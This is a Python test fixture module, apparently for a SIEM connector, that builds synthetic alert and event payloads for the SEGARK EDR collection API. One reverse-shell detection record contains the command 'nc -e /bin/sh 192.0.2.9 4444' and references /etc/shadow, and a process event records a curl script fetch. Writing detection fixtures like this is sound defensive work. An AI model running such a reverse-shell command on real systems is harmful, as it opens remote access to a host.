"""Respostas SINTÉTICAS da API de coleta para SIEM do SEGARK EDR.

Forma copiada do contrato da plataforma (``GET /api/integrations/v1/alerts`` e
``/events``: ``{"items": [...], "next_cursor": str|null}``, erros em
``{"error": {"code", "message"}}``, datas UTC com ``Z``). Ids, hosts, caminhos e
hashes são inventados; o domínio é ``example.com`` e os IPs vêm das faixas de
documentação (RFC 5737). O token é uma string de teste no formato da plataforma
que NÃO é credencial de ninguém. Nada aqui vem de ambiente real.
"""

from __future__ import annotations

import base64
import copy
import json
from datetime import datetime, timedelta, timezone
from typing import Any, Dict, List, Optional

BASE_URL = "https://edr.example.com"
TOKEN = "oedrsvc_" + "T" * 43
DEVICE = "6f1c2a8e-0b7d-4e44-9a51-3c2d7e9f0a11"
SHA = "ab" * 32
FILE_SHA = "cd" * 32
GUID = "1a2b3c4d:4242:987654"
PARENT_GUID = "1a2b3c4d:1:12"


def iso(moment: datetime) -> str:
    return moment.strftime("%Y-%m-%dT%H:%M:%S.%fZ")


def now() -> datetime:
    return datetime.now(timezone.utc).replace(tzinfo=None, microsecond=0)


def ago(**delta: float) -> datetime:
    return now() - timedelta(**delta)


def api_cursor(binding: str, frm: str, to: str, at: str, last: str) -> str:
    """O cursor opaco como a plataforma o codifica (base64url de uma lista JSON)."""
    raw = json.dumps([binding, frm, to, at, last], separators=(",", ":"))
    return base64.urlsafe_b64encode(raw.encode()).decode().rstrip("=")


#: Detecção comportamental de um agente com o contexto de detecção (bloco ``detection``).
ALERT: Dict[str, Any] = {
    "id": "0b6f9a1e-5c43-4f0e-8d2a-7e1b3c5d9f20",
    "device_id": DEVICE,
    "hostname": "srv-01.example.com",
    "device_os": "linux",
    "title": "Reverse shell",
    "severity": "high",
    "source": "detection",
    "status": "new",
    "policy_id": "PROD-reverse-shell",
    "mitre": ["T1059.004", "T1071", "TA0011", "bogus"],
    "observed_at": "2026-11-12T10:00:00Z",
    "first_seen": "2026-11-12T10:00:00Z",
    "last_seen": "2026-11-12T10:00:00Z",
    "case_id": None,
    "category": None,
    "resolution": None,
    "closed_at": None,
    "external_id": "18df7e55-7",
    "group_key": "policy:PROD-reverse-shell",
    "event_id": "9a7c1d2e3f405162",
    "created_at": "2026-11-12T10:00:02.123456Z",
    "updated_at": "2026-11-12T10:00:02.123789Z",
    "detection": {
        "process": {
            "pid": 4242,
            "ppid": 1,
            "guid": GUID,
            "path": "/usr/bin/nc",
            "cmdline": "nc -e /bin/sh 192.0.2.9 4444",
            "user": "root",
            "uid": "0",
            "start": 1762941600,
            "sha256": SHA,
        },
        "parent": {"pid": 1, "guid": PARENT_GUID, "path": "/usr/bin/bash", "cmdline": "bash -i"},
        "file": {"path": "/etc/shadow"},
        "threat": {"source": "rules", "rule_id": "PROD-reverse-shell"},
    },
}

#: Detecção de ML de PE do Windows em modo alerta (sem ação no host).
ML_ALERT: Dict[str, Any] = {
    **copy.deepcopy(ALERT),
    "id": "3c1e0d6b-2f6a-4b7e-9a10-5b2c8d7e6f31",
    "hostname": "ws-07.example.com",
    "device_os": "windows",
    "title": "Windows/ML.Generic-High",
    "policy_id": "ml.pe",
    "mitre": [],
    "external_id": "win-mlpe-" + "0" * 32,
    "detection": {
        "process": {"pid": 5150, "path": "C:\\Users\\demo\\Downloads\\tool.exe", "sha256": SHA},
        "threat": {"type": "malware", "source": "ml", "rule_id": "ml:pe-2", "scan_type": "on_access_exec"},
        "ml": {"score": 0.987654, "band": "block", "model": "pe-2", "mode": "alert", "engine_verdict": "allowed"},
    },
}

#: Veredito antimalware sobre um arquivo (fonte ``av``).
AV_ALERT: Dict[str, Any] = {
    **copy.deepcopy(ALERT),
    "id": "7d2a4b6c-8e0f-4a1b-9c3d-5e7f9a1b3c42",
    "title": "Malware: EICAR-Test",
    "source": "av",
    "policy_id": "",
    "mitre": [],
    "status": "resolved",
    "resolution": "Arquivo removido pela quarentena",
    "closed_at": "2026-11-12T11:00:00Z",
    "case_id": "5a4b3c2d-1e0f-4a9b-8c7d-6e5f4a3b2c1d",
    "detection": {
        "file": {"path": "/home/demo/eicar.com", "sha256": FILE_SHA},
        "threat": {"name": "EICAR-Test", "type": "malware", "blocked": True, "reputation_score": 5},
    },
}

#: Detecção da API da primeira versão: sem ``detection``, ``created_at`` nem ``case_id``.
LEGACY_ALERT: Dict[str, Any] = {
    k: v for k, v in ALERT.items()
    if k not in ("detection", "created_at", "case_id", "category", "resolution", "closed_at",
                 "external_id", "group_key", "event_id")
}


def alert(alert_id: str, updated_at: str, **extra: Any) -> Dict[str, Any]:
    return {**copy.deepcopy(LEGACY_ALERT), "id": alert_id, "updated_at": updated_at, **extra}


def _event(feed: str, columns: Dict[str, str], event_id: str, received_at: str, **extra: Any) -> Dict[str, Any]:
    return {
        "event_id": event_id,
        "device_id": DEVICE,
        "feed": feed,
        "observed_at": "2026-11-12T10:00:00Z",
        "received_at": received_at,
        "time_flag": "",
        "columns": columns,
        "hostname": "srv-01.example.com",
        "device_os": "linux",
        **extra,
    }


def process_event(event_id: str = "e-proc-1", received_at: str = "2026-11-12T10:00:05.250Z", **cols: str) -> Dict[str, Any]:
    columns = {
        "pid": "20294", "path": "/usr/bin/curl", "cmdline": "curl -s https://www.example.com/x.sh",
        "uid": "1000", "parent": "20200", "eid": "77", "syscall": "execve",
        "process_guid": "1a2b3c4d:20294:555", "parent_guid": "1a2b3c4d:20200:444",
        **cols,
    }
    return _event("process_events", columns, event_id, received_at)


def file_event(action: str = "modify", event_id: str = "e-file-1", **cols: str) -> Dict[str, Any]:
    columns = {
        "time": "1762941600", "pid": "3100", "uid": "0", "executable": "/usr/bin/vim",
        "action": action, "target_path": "/etc/hosts", "count": "3", "eid": "88", **cols,
    }
    return _event("file_events", columns, event_id, "2026-11-12T10:00:06Z")


def network_event(direction: str = "out", event_id: str = "e-net-1", **cols: str) -> Dict[str, Any]:
    columns = {
        "time": "1762941600", "pid": "4100", "uid": "1000", "executable": "/usr/bin/curl",
        "direction": direction, "protocol": "tcp", "remote_address": "203.0.113.10",
        "remote_port": "443", "local_port": "51514", "sni": "www.example.com", "count": "2",
        "bytes_sent": "1200", "bytes_received": "54000", "eid": "99", **cols,
    }
    return _event("network_connections", columns, event_id, "2026-11-12T10:00:07Z")


def dns_event(event_id: str = "e-dns-1", **cols: str) -> Dict[str, Any]:
    columns = {
        "time": "1762941600", "pid": "4100", "uid": "1000", "executable": "/usr/bin/curl",
        "query": "www.example.com", "query_type": "A", "resolver": "192.0.2.53", "count": "1",
        "eid": "100", **cols,
    }
    return _event("dns_events", columns, event_id, "2026-11-12T10:00:08Z")


def page(items: List[Dict[str, Any]], next_cursor: Optional[str] = None) -> Dict[str, Any]:
    return {"items": items, "next_cursor": next_cursor}


def error(code: str, message: str) -> Dict[str, Any]:
    return {"error": {"code": code, "message": message}}
